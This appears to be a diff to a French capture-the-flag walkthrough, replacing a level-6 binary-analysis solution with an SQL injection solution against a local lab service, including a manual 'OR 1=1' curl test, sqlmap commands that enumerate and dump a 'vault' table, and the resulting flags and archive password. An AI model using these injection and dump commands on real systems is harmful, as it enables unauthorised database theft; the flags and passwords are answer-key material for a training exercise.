@@ -135,26 +135,56 @@
     - User : frank
     - Pass : FindM3IfYouC4n
 
-### Niveau 6: Rétro-ingénierie (Analyse de binaire)
+### Niveau 6: Injection SQL (SQLMap)
 
-- Un binaire compilé en C nommé `auth_service` est présent dans le répertoire.
-- Il s'agit d'un exécutable vérifiant un mot de passe passé en argument.
-- Utilisez la commande `ltrace` pour observer les appels aux fonctions de bibliothèques dynamiques:
-  `ltrace ./auth_service motdepasse_quelconque`
-- Observez l'appel à la fonction `strcmp` (comparaison de chaînes) qui révèle le texte attendu : `R3v3rs3_M4st3r`.
-- Alternative: la commande `strings auth_service` liste toutes les chaînes de texte, dont le mot de passe s'y trouve.
+- Identifier le service web qui tourne en local :
+  ```bash
+  ss -tulpn
+  # ou : netstat -an | grep LISTEN
+  ```
+  Un service écoute sur `127.0.0.1:5000`.
+
+- Vérifier que l'application répond et observer sa structure :
+  ```bash
+  curl http://127.0.0.1:5000/
+  curl "http://127.0.0.1:5000/search?id=1"
+  ```
+
+- Tester l'injection manuellement (optionnel) :
+  ```bash
+  curl "http://127.0.0.1:5000/search?id=1 OR 1=1"
+  ```
+
+- Lancer SQLMap pour identifier et exploiter la vulnérabilité :
+  ```bash
+  # Enumérer les tables
+  sqlmap -u "http://127.0.0.1:5000/search?id=1" --tables --batch
+
+  # Dumper la table vault qui contient les secrets
+  sqlmap -u "http://127.0.0.1:5000/search?id=1" -T vault --dump --batch
+  ```
+
+- SQLMap révèle le contenu de la table `vault` :
+  ```
+  +----+-------------+--------------------------------------------+
+  | id | secret_name | secret_value                               |
+  +----+-------------+--------------------------------------------+
+  | 1  | FLAG        | FLAG{sql_1nj3ct10n_m4st3r_w1th_sqlm4p}     |
+  | 2  | ZIP_PASS    | SQLmap_0wns_DB                             |
+  +----+-------------+--------------------------------------------+
+  ```
 
 **Décompression de l'archive:**
 ```bash
-  unzip -P R3v3rs3_M4st3r secret.zip
+  unzip -P SQLmap_0wns_DB secret.zip
 
 # Archive:  secret.zip
 # extracting: flag.txt
 # inflating: key_part.txt
-# extracting: next_level.txt
+# extracting: congrats.txt
 ```
 
 #### Fin de partie !
 
-- Le Flag Ultime : FLAG{r3v3rs3_3ng1n33r_g0d}
+- Le Flag Ultime : FLAG{sql_1nj3ct10n_m4st3r_w1th_sqlm4p}
 - Vous avez infiltré EvilCorp et terminé ce CTF.
